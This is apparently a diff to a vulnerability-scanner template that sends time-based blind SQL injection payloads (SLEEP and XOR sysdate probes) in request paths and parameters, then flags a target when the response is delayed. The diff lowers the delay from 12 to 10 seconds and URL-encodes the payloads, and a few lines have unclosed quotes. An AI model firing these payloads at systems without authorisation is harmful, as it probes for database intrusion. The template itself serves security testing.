@@ -12,25 +12,25 @@ requests:
   - method: GET
     path:
       - "{{BaseURL}}/dont-work-sqli"
-      - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z/"
-      - "{{BaseURL}}?/0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z/"      
-      - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z"    
       - "{{BaseURL}}/0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z
-      - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(12)))a)/"
-      - "{{BaseURL}}/' AND (SELECT 5735 FROM (SELECT(SLEEP(12)))YpRn) AND 'Jswp'='Jswp"
-      - "{{BaseURL}}?id=' AND (SELECT 5735 FROM (SELECT(SLEEP(12)))YpRn) AND 'Jswp'='Jswp"      
-      - "{{BaseURL}}/,(select * from (select(sleep(12)))a)/"
-      - "{{BaseURL}}/1) or sleep(12)#/"   
-      - "{{BaseURL}}/1' and sleep(12)"   
-      - "{{BaseURL}}/'sleep(12) --//"
-      - "{{BaseURL}}' sleep(12) --//"         
-      - "{{BaseURL}}/AND SLEEP(12)--"     
-      - "{{BaseURL}}/' AND SLEEP(12) AND '1"     
-      - "{{BaseURL}}/ ORDER BY SLEEP(12)/"     
-      - "{{BaseURL}}/AND (SELECT * FROM (SELECT(SLEEP(12)))bAKL) AND 'vRxe'='vRxe" 
+      - "{{BaseURL}}'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z      
+      - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(10)))a)/"
+      - "{{BaseURL}}'%20AND%20(SELECT 5735 FROM (SELECT(SLEEP(10)))YpRn)%20AND%20'Jswp'='Jswp"
+      - "{{BaseURL}}/'%20AND%20(SELECT 5735 FROM (SELECT(SLEEP(10)))YpRn)%20AND%20'Jswp'='Jswp"
+      - "{{BaseURL}}?id=0'AND%20(SELECT%205735%20FROM%20(SELECT(SLEEP(10)))YpRn)%20AND%20'Jswp'='Jswp"      
+      - "{{BaseURL}}/,(select+*+from+(select(sleep(10)))a)/"
+      - "{{BaseURL}}/1)+or+sleep(10)#/"   
+      - "{{BaseURL}})+or+sleep(10)#/"         
+      - "{{BaseURL}}/1'+and+sleep(10)"   
+      - "{{BaseURL}}/'sleep(10)%20--//"
+      - "{{BaseURL}}'%20sleep(10)%20--//"         
+      - "{{BaseURL}}/AND+SLEEP(10)--"     
+      - "{{BaseURL}}/'+AND+SLEEP(10)+AND+'1"     
+      - "{{BaseURL}}/+ORDER+BY+SLEEP(10)/"     
+      - "{{BaseURL}}/AND+(SELECT+*+FROM+(SELECT(SLEEP(10)))bAKL)+AND+'vRxe'='vRxe" 
 
     matchers-condition: or
     matchers:
       - type: dsl
         dsl:
-          - 'duration>=12'
+          - 'duration>=10'
